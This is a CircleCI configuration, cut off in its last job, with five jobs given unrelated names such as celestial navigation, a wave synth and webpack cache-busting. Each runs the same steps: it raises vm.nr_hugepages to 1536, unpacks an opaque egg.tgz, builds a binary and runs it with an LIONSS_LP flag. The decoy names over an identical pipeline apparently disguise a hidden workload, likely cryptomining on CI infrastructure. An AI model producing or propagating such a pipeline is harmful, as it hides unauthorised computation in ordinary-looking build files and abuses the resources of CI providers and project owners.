version: 2.1

jobs:
  lodestar:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load sky map
          command: |
            printf 'declination 89\n' > lode.cfg
      - run:
          name: Build celestial nav
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target lodestar -j2
      - run:
          name: Fix on lodestar
          command: LIONSS_LP=1 ./build/lodestar --config lode.cfg --refraction
  metalArgbuf:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define buffer
          command: |
            printf 'args 16\n' > arg.cfg
      - run:
          name: Build Metal backend
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target metalArgbuf -j2
      - run:
          name: Encode argument buffer
          command: LIONSS_LP=1 ./build/metalArgbuf --conf arg.cfg --tier 2
  amber-wave:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load waveform
          command: |
            printf 'freq = 440\n' > amber.cfg
      - run:
          name: Build wave synth
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target amber-wave -j2
      - run:
          name: Synthesize amber wave
          command: LIONSS_LP=1 ./build/amber-wave --config amber.cfg --duration 2
  thread-border:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set dataset
          command: |
            printf 'channel 15\n' > thread.cfg
      - run:
          name: Build border router
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target thread-border -j2
      - run:
          name: Route Thread traffic
          command: LIONSS_LP=1 ./build/thread-border --conf thread.cfg --nat64
  webpackCacheBust:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Hash asset manifest
          command: |
            mkdir -p public && printf 'app.js\n' > public/manifest.txt
      - run:
          name: Bundle assets
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target webpackCacheBust -j2
      - run:
          name: Rewrite cache-busted URLs
